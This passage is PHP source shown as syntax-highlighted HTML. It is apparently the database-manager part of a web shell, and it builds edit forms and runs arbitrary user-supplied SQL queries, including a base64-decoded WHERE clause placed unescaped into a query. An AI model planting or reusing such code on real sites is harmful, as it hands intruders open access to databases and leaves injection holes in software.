#515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Update record in '<\/span>.$<span style=\"color: #ffcc66;\">tablename<\/span>.<span style=\"color: #66cccc;\">' table &amp;raquo;&lt;\/h2<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(<\/span>$<span style=\"color: #ffcc66;\">base64<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SELECT * FROM $tablename WHERE $where LIMIT<\/span><span style=\"color: #66cccc; text-decoration: underline;\"> 1\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rs<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form method=\"post\" action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">dbform<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'tablename'<\/span>,$<span style=\"color: #ffcc66;\">tablename<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">rowdb<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">row<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">rs<\/span>[$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>]]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">value<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">htmlspecialchars(<\/span>$<span style=\"color: #ffcc66;\">rs<\/span>[$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>]]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">value<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"this.className=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'focus\\';\" onmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Key'<\/span>] == <span style=\"color: #66cccc;\">'UNI'<\/span> || $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Extra'<\/span>] == <span style=\"color: #66cccc;\">'auto_incre<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ment'<\/span><span style=\"text-decoration: underline;\"> || $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">row<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Key'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'PRI'<\/span><span style=\"text-decoration: underline;\">) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;&lt;b&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/b&gt;&lt;br \/&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Type'<\/span>].<span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/td&gt;&lt;td&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">value<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;nbsp;&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {<span style=\"color: #f2777a; background-color: #515151;\">                            <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;&lt;b&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Field'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/b&gt;&lt;br \/&gt;'<\/span>.$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #66cccc;\">'Type'<\/span>].<span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/td&gt;&lt;td&gt;&lt;textarea class=\"area\" name=\"insertsql['<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">row<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Field'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">']\" style=\"width:500px;height:60px;overflow:auto;\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">value<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/textarea&gt;&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'insert'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>).<span style=\"color: #66cccc;\">'\"&gt;&lt;td colspan=\"2\"&gt;&lt;input class=\"bt<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\" type=\"submit\" name=\"insert\" value=\"Insert\" \/&gt;&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>).<span style=\"color: #66cccc;\">'\"&gt;&lt;td colspan=\"2\"&gt;&lt;input class=\"bt<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\" type=\"submit\" name=\"update\" value=\"Update\" \/&gt;&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'base64'<\/span>, $<span style=\"color: #ffcc66;\">base64<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/table&gt;&lt;\/form&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">querys<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">';'<\/span>,$<span style=\"color: #ffcc66;\">sql_query<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">querys<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">num<\/span>=&gt;$<span style=\"color: #ffcc66;\">query<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">query<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;p&gt;&lt;b&gt;Query#{$num} : \"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">htmlspecialchars(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>,<span style=\"color: #6699cc;\">EN<\/span><span style=\"color: #6699cc; text-decoration: underline;\">T_QUOTES<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&lt;\/b&gt;&lt;\/p&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">switch<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">qy(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">case<\/span> <span style=\"color: #6699cc;\">0<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Error : '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_error(<\/span>).<span style=\"color: #66cccc;\">'&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">break<\/span>;<span style=\"color: #f2777a; background-color: #515151;\">  <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">case<\/span> <span style=\"color: #6699cc;\">1<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">strtolower(substr(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">13<\/span>)) == <span style=\"color: #66cccc;\">'sele<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ct * from'<\/span><span style=\"text-decoration: underline;\">) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">allowedit<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">getnumsql<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tatol<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_num_rows(q(<\/span>$<span style=\"color: #ffcc66;\">getnumsql<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">multipage<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">multi(<\/span>$<span style=\"color: #ffcc66;\">tatol<\/span>, $<span style=\"color: #ffcc66;\">pagenum<\/span>, $<span style=\"color: #ffcc66;\">pa<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ge<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">tablename<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">sql_line<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(array(<\/span><span style=\"color: #66cccc;\">\"\\r\"<\/span>, <span style=\"color: #66cccc;\">\"\\n\"<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\t\"<\/span><span style=\"text-decoration: underline;\">), <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">array(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' '<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' '<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' '<\/span><span style=\"text-decoration: underline;\">), <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">trim(htmlspecialchars(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">query<\/span><span style=\"text-decoration: underline;\">)));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">sql_line<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">preg_replace(<\/span><span style=\"color: #66cccc;\">\"\/\\\/\\*[^(\\*\\\/)]<\/span><span style=\"color: #66cccc; text-decoration: underline;\">*\\*\\\/\/i\"<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\" \"<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">sql_line<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> 